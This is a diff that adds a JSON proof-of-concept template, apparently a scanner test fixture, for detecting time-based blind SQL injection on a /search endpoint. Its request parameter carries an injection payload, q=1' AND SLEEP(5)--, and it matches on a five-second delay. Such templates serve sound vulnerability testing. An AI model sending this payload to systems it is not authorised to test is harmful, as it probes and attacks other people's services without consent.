@@ -1,0 +1,25 @@
+{
+  "pocInfo": {
+    "vulID": "test-001",
+    "version": "1",
+    "name": "Basic Time-Based Blind Injection",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "TestAuthor"
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/search",
+        "params": "q=1' AND SLEEP(5)--",
+        "necessary": "",
+        "match": {
+          "time": "5"
+        }
+      }
+    ]
+  }
+}
+
